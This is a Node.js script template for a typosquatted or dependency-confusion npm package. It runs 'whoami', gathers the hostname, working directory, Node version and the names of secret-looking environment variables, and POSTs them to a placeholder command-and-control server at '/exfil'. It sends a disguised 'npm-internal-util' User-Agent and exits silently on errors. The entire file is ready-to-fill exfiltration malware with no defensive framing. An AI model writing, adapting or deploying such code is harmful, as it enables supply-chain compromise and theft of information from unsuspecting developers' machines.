const https = require('https');
const os = require('os');
const { execSync } = require('child_process');

const payload = {
  whoami: execSync('whoami', {encoding:'utf8'}).trim(),
  hostname: os.hostname(),
  cwd: process.cwd(),
  node_version: process.version,
  env_secrets: Object.keys(process.env).filter(k => /KEY|SECRET|TOKEN|PASS|API|PWD|AUTH/i.test(k)),
  timestamp: new Date().toISOString(),
  package: "YOUR_SQUATTED_PACKAGE_NAME_HERE"
};

const data = JSON.stringify(payload);

const req = https.request({
  hostname: 'YOUR_C2_DOMAIN_HERE',   // ← CHANGE TO YOUR SERVER/ngrok
  port: 443,
  path: '/exfil',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': data.length,
    'User-Agent': 'npm-internal-util'
  }
}, () => process.exit(0));

req.on('error', () => process.exit(0));
req.write(data);
req.end();
